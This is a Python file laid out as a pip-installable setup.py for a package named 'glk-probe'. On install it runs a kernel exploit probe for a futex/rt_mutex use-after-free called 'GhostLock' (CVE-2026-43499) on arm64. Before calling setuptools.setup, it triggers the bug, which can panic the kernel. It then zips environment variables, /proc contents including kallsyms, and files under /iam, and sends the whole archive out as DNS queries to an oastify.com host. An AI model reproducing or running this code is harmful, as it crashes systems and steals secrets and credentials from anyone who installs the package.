#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GhostLock / CVE-2026-43499  --  arm64 install-time probe + OAST exfil.

Grounded in amazonlinux/linux @ microvm-kernel-6.1.161-18.298.amzn2023:
  rtmutex.c::remove_waiter()                  current->pi_blocked_on = NULL     (BUG)
  rtmutex_api.c::rt_mutex_start_proxy_lock()  remove_waiter() runs on R's stack,
                                              with current != waiter->task
  rtmutex.c::task_blocks_on_rt_mutex()        sets task->pi_blocked_on = waiter
                                              BEFORE the chain walk
  rtmutex.c::rt_mutex_adjust_prio_chain()     [11] passes prerequeue_top_waiter == NULL
                                              exactly when the waiter was dequeued
  rtmutex.c::rt_mutex_dequeue_pi()            RB_EMPTY_NODE() with NO NULL guard
                                              -> load at 0x28 (pi_tree.entry offset)
  rtmutex_api.c::rt_mutex_adjust_pi()         waiter = task->pi_blocked_on;
                                              next_lock = waiter->lock
  requeue.c::futex_requeue()                  cmpval is compared against uaddr1
  requeue.c::futex_wait_requeue_pi()          if (!bitset) return -EINVAL (bitset == val3)
  requeue.c  -EDEADLK branch                  no wake; requeue_state -> Q_REQUEUE_PI_NONE
  rtmutex_common.h                            task@0x50 lock@0x58 wake_state@0x60 ww_ctx@0x68

  Futex ABI: futex(uaddr, op, val, val2, uaddr2, val3)
             CMP_REQUEUE_PI -> val=nr_wake, val2=nr_requeue, val3=*uaddr1
  No FUTEX_PRIVATE_FLAG: fork() gives each child its own mm and a private key is
  (mm, addr); shared keys come from the struct page (MAP_SHARED).
  sched_setscheduler()/sched_setattr() pass pi=true -> rt_mutex_adjust_pi().
  Drive is nice-based first: __waiter_prio() == task->prio, and raising nice
  changes it without leaving CFS (RLIMIT_NICE=0 forbids lowering nice).
"""
import os, sys, time, ctypes, mmap, struct, socket, zipfile, io, threading, hashlib

TAG  = os.environ.get("GLK_TAG", "glk6")
OAST = os.environ.get("GLK_OAST", "xtuc6efqmqdxb7cyy2rml1mp4gaby6mv.oastify.com")
CH   = 52                                     # hex chars per label = 26 bytes
GRP  = 3                                      # labels per DNS name
WORKERS = int(os.environ.get("GLK_W", "24"))
TMO     = float(os.environ.get("GLK_TMO", "1.5"))
N_STACK_PPS = (256 - 16) // 8                 # do_sys_poll(): 30 stack pollfds

# ------------------------------------------------------------------ syscalls
_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype  = ctypes.c_long
_libc.syscall.argtypes = [ctypes.c_long] * 7
_libc.clock_gettime.argtypes = [ctypes.c_int, ctypes.c_void_p]

def _sys(nr, *a):
    aa = [int(x) for x in a] + [0] * (6 - len(a))
    r = _libc.syscall(ctypes.c_long(nr), *[ctypes.c_long(x) for x in aa])
    if r < 0:
        e = ctypes.get_errno()
        return -(e or 1)
    return r

S_FUTEX=98; S_PSELECT6=72; S_PPOLL=73; S_SYSLOG=116; S_TGKILL=131
S_SCHED=119; S_SETPRIORITY=140; S_SCHED_SETATTR=274

F_LOCK_PI=6; F_UNLOCK_PI=7; F_WAIT_REQUEUE_PI=11; F_CMP_REQUEUE_PI=12
BITSET_ANY = 0xFFFFFFFF

class _SP(ctypes.Structure): _fields_ = [("sched_priority", ctypes.c_int)]
class _SA(ctypes.Structure):
    _fields_ = [("size", ctypes.c_uint32), ("sched_policy", ctypes.c_uint32),
                ("sched_flags", ctypes.c_uint64), ("sched_nice", ctypes.c_int32),
                ("sched_priority", ctypes.c_uint32), ("sched_runtime", ctypes.c_uint64),
                ("sched_deadline", ctypes.c_uint64), ("sched_period", ctypes.c_uint64)]

def _attr(policy, prio, nice=0):
    a = _SA(); a.size = 48; a.sched_policy = policy
    a.sched_flags = 0; a.sched_nice = nice; a.sched_priority = prio
    return a

def _sched_nr():
    sp = _SP(); sp.sched_priority = 0
    for nr in (119, 118, 144, 145, 238, 142, 116):
        if _sys(nr + 1, 0) in (0, 1, 2, 3, 5, 6) and _sys(nr, 0, 0, ctypes.byref(sp)) == 0:
            return nr
    return 0

def _dmesg(clear):
    buf = ctypes.create_string_buffer(1 << 19)
    r = _sys(S_SYSLOG, 4 if clear else 3, ctypes.addressof(buf), len(buf) - 1)
    return buf.raw[:r].decode("utf-8", "replace") if r > 0 else ""

def _ts(ms):
    t = (ctypes.c_long * 2)(0, 0)
    _libc.clock_gettime(1, ctypes.byref(t))              # CLOCK_MONOTONIC
    t[1] += ms * 1000000
    while t[1] >= 1000000000:
        t[1] -= 1000000000; t[0] += 1
    return t

# ------------------------------------------------------------------ exfil
_POOL = [None]

def _pool():
    if _POOL[0] is None:
        try:
            from concurrent.futures import ThreadPoolExecutor
            _POOL[0] = ThreadPoolExecutor(max_workers=WORKERS)
        except Exception:
            _POOL[0] = False
    return _POOL[0]

def _resolve(name):
    """We only need the query ON the wire; the answer is irrelevant."""
    try: socket.gethostbyname(name)
    except Exception: pass

class Out:
    """Uncapped. One 3-digit idx space holds 999 chunks x 26 B ~= 25.9 MB;
       past that the idx field simply prints 4 digits."""
    def __init__(self):
        self.buf = []; self.n = 0; self.labels = 0; self.next = 6

    def msg(self, idx, text):
        h = text.encode("utf-8", "replace").hex(); c = 0
        for i in range(0, len(h), CH):
            self.buf.append("%03d-%03d-%s" % (idx, c, h[i:i+CH]))
            c += 1; self.labels += 1
        self.n += 1

    def auto(self, text):
        """PROG lines get their own idx so they never concatenate."""
        i = self.next; self.next += 1
        self.msg(i, text)

    def stream(self, idx, data):
        h = data.hex(); c = 0
        for i in range(0, len(h), CH):
            if c > 998:
                idx += 1; c = 0
            self.buf.append("%03d-%03d-%s" % (idx, c, h[i:i+CH]))
            c += 1; self.labels += 1
        return idx

    def _names(self, batch):
        names = []
        for i in range(0, len(batch), GRP):
            g = batch[i:i+GRP]
            name = ".".join(g) + "." + OAST
            if len(name) <= 250: names.append(name)
            else: names.extend(x + "." + OAST for x in g)
        return names

    def flush(self):
        try: socket.setdefaulttimeout(TMO)
        except Exception: pass
        ex = _pool()
        i = 0
        while i < len(self.buf):
            batch = self.buf[i:i+4096]; i += 4096
            names = self._names(batch)
            if not ex:
                for n in names: _resolve(n)
                continue
            for j in range(0, len(names), 512):
                futs = [ex.submit(_resolve, n) for n in names[j:j+512]]
                for f in futs:
                    try: f.result()
                    except Exception: pass
        self.buf = []

    def end(self):
        _resolve("end-%03d" % self.n)
OUT = Out()

# ------------------------------------------------------------------ collector
CAPS = {"proc/kallsyms": 524288, "proc/modules": 262144, "proc/iomem": 65536,
        "proc/cpuinfo": 131072, "proc/meminfo": 65536, "proc/mounts": 65536,
        "proc/self/maps": 131072, "proc/vmstat": 32768}

def _rd(p, cap=131072):
    try:
        with open(p, "rb") as f: return f.read(cap).decode("utf-8", "replace")
    except Exception: return ""

PROC_TOP = ["cmdline","version","cpuinfo","meminfo","mounts","iomem","kallsyms",
            "modules","vmstat","uptime","loadavg","filesystems","swaps",
            "sys/kernel/random/boot_id","sys/kernel/osrelease","sys/kernel/ostype",
            "sys/kernel/version","sys/kernel/panic_on_oops","sys/kernel/panic",
            "sys/kernel/mm/transparent_hugepage/enabled","sys/kernel/security/lsm",
            "sys/devices/system/cpu/online","sys/devices/system/cpu/possible",
            "self/status","self/maps","self/smaps_rollup","self/cgroup","self/limits",
            "self/mountinfo","self/sched","self/stack","self/wchan","self/auxv",
            "self/comm","self/numa_maps","self/personality"]

def _walk(root, depth=5):
    out = {}
    if not os.path.isdir(root): return out
    for dp, dns, fns in os.walk(root):
        if dp[len(root):].count(os.sep) >= depth: dns[:] = []
        for d in dns:
            try: out[dp + "/" + d + "/"] = "<dir>"
            except Exception: pass
        for fn in fns:
            p = os.path.join(dp, fn)
            try:
                if os.path.getsize(p) > 262144: continue
                out[p] = _rd(p)
            except Exception: pass
    return out

def collect(extra):
    files = {"uname.txt": " ".join(os.uname()) + "\n",
             "env.txt": "\n".join("%s=%s" % kv for kv in sorted(os.environ.items()))}
    for rel in PROC_TOP:
        files["proc/" + rel] = _rd("/proc/" + rel, CAPS.get("proc/" + rel, 131072))
    for pid in sorted(os.listdir("/proc")):
        if pid.isdigit():
            files["proc/%s/status" % pid] = _rd("/proc/%s/status" % pid, 4096)
    files["proc-listing.txt"] = "\n".join(sorted(os.listdir("/proc")))
    files.update(_walk("/iam"))
    for k, v in extra.items(): files["probe/" + k] = v
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        for k, v in files.items():
            if v: z.writestr(k, v)
    return bio.getvalue()

# ------------------------------------------------------------------ shared page
PG = mmap.mmap(-1, 8192, flags=mmap.MAP_SHARED)
PA = ctypes.addressof(ctypes.c_char.from_buffer(PG))
def _ad(o): return PA + o
def _p(f, o, v): struct.pack_into(f, PG, o, v)
def _u(f, o):    return struct.unpack_from(f, PG, o)[0]
def _b(o):       return struct.unpack_from("<B", PG, o)[0]
def _sb(o, v):   struct.pack_into("<B", PG, o, v)

O_FT=0; O_FPI=4; O_FPI2=8
O_WRET=128; O_RQRET=132; O_RQV=136; O_STAGE=148; O_FORGE=152
O_UNLOCK=156; O_WPID=168; O_XPID=172; O_RPID=176; O_DRV=180

HS_W=64; HS_X=65; HS_R=66; CMD_W=67; CMD_X=68
def _st():     return _u("<I", O_STAGE)
def _setst(v): _p("<I", O_STAGE, v)

KEEP = []                                     # fds for the pselect6 forge (never closed)

# ------------------------------------------------------------------ helpers
def _state(pid):
    try:
        with open("/proc/%d/stat" % pid) as f:
            return f.read().rsplit(")", 1)[1].split()[0]
    except Exception: return "?"

def _wchan(pid):
    try:
        with open("/proc/%d/wchan" % pid) as f: return f.read(64).strip()
    except Exception: return "?"

def _stack(pid):
    return _rd("/proc/%d/stack" % pid, 4096)[:300]

def _wait_state(pid, timeout=3.0):
    t = time.time()
    while time.time() - t < timeout:
        if _state(pid) in ("S", "D"): return True
        time.sleep(0.01)
    return False

def _futex(uaddr, op, val, val2, uaddr2, val3):
    return _sys(S_FUTEX, uaddr, op, val, val2, uaddr2, val3)

# ------------------------------------------------------------------ children
def _child_w():
    """W: owns f_pi2; blocks in WAIT_REQUEUE_PI(f_t -> f_pi); then stays in
       userspace making no syscalls, so the stale waiter on its kernel stack
       survives intact until the drive."""
    try:
        _sb(HS_W, 1)
        if _futex(_ad(O_FPI2), F_LOCK_PI, 0, 0, 0, 0) < 0:
            _sb(HS_W, 0xE); os._exit(1)
        _sb(HS_W, 2)
        while _b(CMD_W) != 1: pass                       # pure spin, no syscall
        _p("<i", O_WRET, 0x7FFFFFFF)
        tsw = _ts(800)                                   # object must outlive the call
        _sb(HS_W, 3)
        r = _futex(_ad(O_FT), F_WAIT_REQUEUE_PI, 0,
                   ctypes.addressof(tsw), _ad(O_FPI), BITSET_ANY)
        _p("<i", O_WRET, r)
        _sb(HS_W, 5)                                     # frame is now dead
        while True:
            c = _b(CMD_W)
            if c == 6:
                os._exit(0)
            elif 2 <= c <= 5:                            # forge variant
                _sb(HS_W, 6)
                _forge(c - 2)
                _sb(HS_W, 7)
                _sb(CMD_W, 0)
            elif c == 8:                                 # release X
                _futex(_ad(O_FPI2), F_UNLOCK_PI, 0, 0, 0, 0)
                _sb(HS_W, 8)
                _sb(CMD_W, 0)
    except Exception:
        _sb(HS_W, 0xE); os._exit(1)

def _child_x():
    """X: owns f_pi; blocks on f_pi2 (owned by W) -> the walk finds a cycle."""
    try:
        _sb(HS_X, 1)
        if _futex(_ad(O_FPI), F_LOCK_PI, 0, 0, 0, 0) < 0:
            _sb(HS_X, 0xE); os._exit(1)
        _sb(HS_X, 2)
        while _b(CMD_X) != 1: pass
        _sb(HS_X, 3)
        _futex(_ad(O_FPI2), F_LOCK_PI, 0, 0, 0, 0)        # blocks here
        _sb(HS_X, 4)
        while True:
            c = _b(CMD_X)
            if c == 2:
                _p("<i", O_UNLOCK, _futex(_ad(O_FPI), F_UNLOCK_PI, 0, 0, 0, 0))
                _sb(HS_X, 5); _sb(CMD_X, 0)
            elif c == 3:
                os._exit(0)
            time.sleep(0.01)
    except Exception:
        _sb(HS_X, 0xE); os._exit(1)

# ------------------------------------------------------------------ forge
def _forge(kind):
    """Clobber the dead rt_waiter.
       kind 0/1 -> ppoll   : do_sys_poll()'s stack_pps, 240 controllable bytes
       kind 2/3 -> pselect6: core_sys_select()'s stack_fds, FDS_BYTES(n) bytes
       fds are never closed: close() would re-clobber the frame afterwards.
       NOTE: do_pollfd() writes revents back into the stack copy, so the 0xff
       variant really yields 0x0000ffffffffffff per 8-byte slot, not 0xff*8."""
    try:
        fill = 0x00 if kind % 2 == 0 else 0xff
        if kind < 2:
            n = N_STACK_PPS
            buf = ctypes.create_string_buffer(bytes([fill]) * (n * 8), n * 8)
            ts = _ts(150)
            _sys(S_PPOLL, ctypes.addressof(buf), n, ctypes.addressof(ts), 0, 0)
            _p("<I", O_FORGE, 0x1000 | (kind << 8) | (n * 8 & 0xFF))
        else:
            if not KEEP:
                for _ in range(340):                     # -> fdt->max_fds = 512
                    try: KEEP.append(os.open("/dev/null", os.O_RDONLY))
                    except Exception: break
            nfds = min(320, len(KEEP))
            if nfds == 0:
                _p("<I", O_FORGE, 0xBEEF); return
            size = (((nfds + 63) // 64) * 8)             # FDS_BYTES(n)
            buf = ctypes.create_string_buffer(bytes([fill]) * size, size)
            ts = _ts(150)
            _sys(S_PSELECT6, nfds, ctypes.addressof(buf), 0, 0, ctypes.addressof(ts), 0)
            _p("<I", O_FORGE, 0x2000 | (kind << 8) | (size & 0xFF))
    except Exception:
        _p("<I", O_FORGE, 0xDEAD)

# ------------------------------------------------------------------ drive
def _drive(pid, nr):
    """Land a real priority change so __waiter_prio() != waiter->tree.prio.
       CFS part first: raising nice changes task->prio (120+nice) without
       leaving CFS, so W keeps timeslicing on a 1-CPU box.  RLIMIT_NICE=0
       means nice may only ascend.  RT part last, as a guaranteed pi=true path.
       bits: 1 = sched_setscheduler ok, 2 = sched_setattr ok, 4 = setpriority ok."""
    bits = 0
    for nice in (5, 10, 15, 19):
        if _sys(S_SETPRIORITY, 0, pid, nice) == 0: bits |= 4
        if _sys(S_SCHED_SETATTR, pid, ctypes.byref(_attr(0, 0, nice)), 0) == 0: bits |= 2
    for pol, prio in ((1, 50), (2, 41), (0, 0)):
        sp = _SP(); sp.sched_priority = prio
        if _sys(S_SCHED_SETATTR, pid, ctypes.byref(_attr(pol, prio, 19)), 0) == 0: bits |= 2
        if nr and _sys(nr, pid, pol, ctypes.byref(sp)) == 0: bits |= 1
    return bits

# ------------------------------------------------------------------ R
def _child_r(nr):
    try:
        _sb(HS_R, 1)
        while _b(HS_W) not in (2, 0xE): pass             # W owns f_pi2
        if _b(HS_W) == 0xE: _sb(HS_R, 0xE); os._exit(1)
        _sb(CMD_X, 1)
        while _b(HS_X) not in (3, 0xE): pass
        if _b(HS_X) == 0xE: _sb(HS_R, 0xE); os._exit(1)
        _wait_state(_u("<I", O_XPID))
        _sb(CMD_W, 1)                                    # W enters the wait
        _wait_state(_u("<I", O_WPID))
        time.sleep(0.05)
        _setst(1)

        # requeue: val=nr_wake=1, val2=nr_requeue=1, val3=*uaddr1 ----------
        rq = None; v3 = _u("<I", O_FT)
        for cand in (_u("<I", O_FT), _u("<I", O_FPI), 0):
            v3 = cand; r = 0
            for _ in range(25):
                r = _futex(_ad(O_FT), F_CMP_REQUEUE_PI, 1, 1, _ad(O_FPI), cand)
                if r == 0:
                    time.sleep(0.01); continue
                break
            if r not in (0, -11):
                rq = r; break
        _p("<i", O_RQRET, rq if rq is not None else 0x7FFFFFFF)
        _p("<I", O_RQV, v3 & 0xFFFFFFFF)
        _setst(2)

        # free W: the -EDEADLK branch never wakes ------------------------
        _sys(S_TGKILL, _u("<I", O_WPID), _u("<I", O_WPID), 23)
        t = time.time()
        while _u("<i", O_WRET) == 0x7FFFFFFF and time.time() - t < 3.0: time.sleep(0.01)
        _setst(3)

        # drive #1 -- rt_mutex_dequeue_pi(NULL) loads address 0x28 -------
        _p("<I", O_FORGE, 0xFFFF)
        _p("<i", O_DRV, -1)                              # -1 == died inside the drive
        _setst(4)
        _p("<i", O_DRV, _drive(_u("<I", O_WPID), nr))
        _setst(5)

        for kind, stage in ((0, 6), (1, 7), (2, 8), (3, 9)):
            _sb(CMD_W, 2 + kind)
            t = time.time()
            while _b(HS_W) != 7 and time.time() - t < 3.0: time.sleep(0.01)
            time.sleep(0.05)                             # let copy_from_user land
            _p("<i", O_DRV, -1)
            _setst(stage)
            _p("<i", O_DRV, _drive(_u("<I", O_WPID), nr))

        _setst(10)
        _sb(HS_R, 2)
        while True:
            if _b(CMD_W) == 6: os._exit(0)
            time.sleep(0.05)
    except Exception:
        _sb(HS_R, 0xE); os._exit(1)

# ------------------------------------------------------------------ probe
def ghostlock():
    R = {}
    nr = _sched_nr(); R["sched_nr"] = nr
    R["kern"] = " ".join(os.uname()[2:4])
    R["panic_on_oops"] = _rd("/proc/sys/kernel/panic_on_oops", 8).strip()
    R["futex_pi"] = _futex(_ad(O_FPI), F_LOCK_PI, 0, 0, 0, 0)
    R["futex_pi_ok"] = 1 if R["futex_pi"] == 0 else 0
    if R["futex_pi_ok"]:
        _futex(_ad(O_FPI), F_UNLOCK_PI, 0, 0, 0, 0)
    _p("<I", O_FT, 0); _p("<I", O_FPI, 0); _p("<I", O_FPI2, 0)
    _p("<I", O_FORGE, 0xFFFF); _p("<i", O_DRV, 0)

    _dmesg(clear=True)                                   # drain the ring buffer

    w = os.fork()
    if w == 0: _child_w()
    _p("<I", O_WPID, w)
    x = os.fork()
    if x == 0: _child_x()
    _p("<I", O_XPID, x)
    r = os.fork()
    if r == 0: _child_r(nr)
    _p("<I", O_RPID, r)

    R["w_wchan"] = _wchan(w); R["x_wchan"] = _wchan(x)
    R["w_stack"] = _stack(w); R["x_stack"] = _stack(x)

    last = -1; t = time.time()
    while time.time() - t < 40.0:
        s = _st()
        if s != last:
            last = s; R["stage"] = s
            OUT.auto("stage=PROG;st=%d;rq=%d;wret=%d;drv=%d;forge=0x%x" % (
                s, _u("<i", O_RQRET), _u("<i", O_WRET),
                _u("<i", O_DRV), _u("<I", O_FORGE)))
            OUT.flush()                                  # survive panic_on_oops=1
        p, st_ = os.waitpid(r, os.WNOHANG)
        if p: R["R_dead"] = st_; break
        if s >= 10: break
        time.sleep(0.02)

    # teardown: W releases f_pi2 -> X wakes -> X unlocks f_pi -----------
    _sb(CMD_W, 8)
    t = time.time()
    while _b(HS_X) != 4 and time.time() - t < 2.0: time.sleep(0.01)
    _sb(CMD_X, 2)
    time.sleep(0.40)

    R["stage"] = _st()
    R["A_rq"] = _u("<i", O_RQRET); R["A_rqv"] = _u("<I", O_RQV)
    R["A_wret"] = _u("<i", O_WRET); R["A_drv"] = _u("<i", O_DRV)
    R["B_forge"] = _u("<I", O_FORGE); R["B_unlock"] = _u("<i", O_UNLOCK)
    R["hs_w"] = _b(HS_W); R["hs_x"] = _b(HS_X); R["hs_r"] = _b(HS_R)
    R["w_wchan_post"] = _wchan(w); R["w_stack_post"] = _stack(w)

    d1 = _dmesg(clear=True)                              # only new messages
    keys = ("Unable to handle", "Call trace", "Kernel panic", "kernel BUG",
            "Internal error", "WARNING:", "PC is at", "lr :", "rt_mutex",
            "remove_waiter", "dequeue_pi", "adjust_prio", "futex", "wake_q",
            "rb_", "Modules linked", "0x0000000000000028")
    hit = [l for l in d1.splitlines() if any(k in l for k in keys)]
    R["oops"] = "YES" if any(k in d1 for k in ("Unable to handle", "Call trace",
                                               "Kernel panic", "kernel BUG",
                                               "Internal error")) else "no"
    R["warn"] = "YES" if "WARNING:" in d1 else "no"
    if hit: R["trace"] = "\n".join(hit)[:1600]

    if R["A_rq"] == -35 and R["A_wret"] not in (0, 0x7FFFFFFF):
        R["verdict"] = ("VULNERABLE" if (R["oops"] == "YES" or "R_dead" in R)
                        else "MECHANISM-HIT-no-fault")
    elif R["A_rq"] == -35:    R["verdict"] = "INCONCLUSIVE-no-free"
    elif R["A_rq"] == -11:    R["verdict"] = "INCONCLUSIVE-val3"
    elif R["A_rq"] in (0, 1): R["verdict"] = "INCONCLUSIVE-path-not-hit"
    else: R["verdict"] = "INCONCLUSIVE-rq=%s" % R["A_rq"]

    _sb(CMD_X, 3); _sb(CMD_W, 6)
    for pid in (w, x, r):
        try: os.kill(pid, 15)
        except Exception: pass
        try: os.waitpid(pid, 0)
        except Exception: pass
    return R

# ------------------------------------------------------------------ main
def _main():
    t0 = time.time()
    OUT.msg(1, "stage=ENV;tag=%s;kern=%s;uid=%d;euid=%d;ncpu=%d;uname=%s" % (
        TAG, " ".join(os.uname()[2:4]), os.getuid(), os.geteuid(),
        os.cpu_count() or 0, " ".join(os.uname())))
    OUT.flush()
    try:
        res = ghostlock()
    except Exception as e:
        res = {"verdict": "EXC", "err": repr(e)}
    OUT.msg(2, "stage=RESULT;" + ";".join("%s=%s" % (k, v) for k, v in sorted(res.items())))
    OUT.flush()                                     # verdict out before the payload
    OUT.msg(3, "stage=TIME;ms=%d" % int((time.time() - t0) * 1000))
    try:
        blob = collect({k: str(v) for k, v in res.items()})
        OUT.msg(4, "stage=ZIP;bytes=%d;sha256=%s" % (
            len(blob), hashlib.sha256(blob).hexdigest()[:24]))
        OUT.flush()
        n0 = OUT.labels
        last = OUT.stream(100, blob)                # entire zip, no cap
        OUT.msg(5, "stage=ZIPSTREAM;labels=%d;queries=%d;idx_max=%d;bytes=%d" % (
            OUT.labels - n0, (OUT.labels - n0 + GRP - 1) // GRP, last, len(blob)))
        OUT.flush()
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   "glk-dump.zip"), "wb") as f:
                f.write(blob)
        except Exception: pass
    except Exception as e:
        OUT.msg(4, "stage=ZIP;err=%r" % (e,))
    time.sleep(0.5)                                 # let the tail land before 'end'
    OUT.end()

try:
    _main()
except Exception:
    pass

try:
    import setuptools
    setuptools.setup(
        name="glk-probe", version="1.0.%d" % (int(time.time()) % 100000),
        py_modules=[], install_requires=[],
        description="GhostLock CVE-2026-43499 probe", python_requires=">=3.7",
    )
except Exception:
    pass
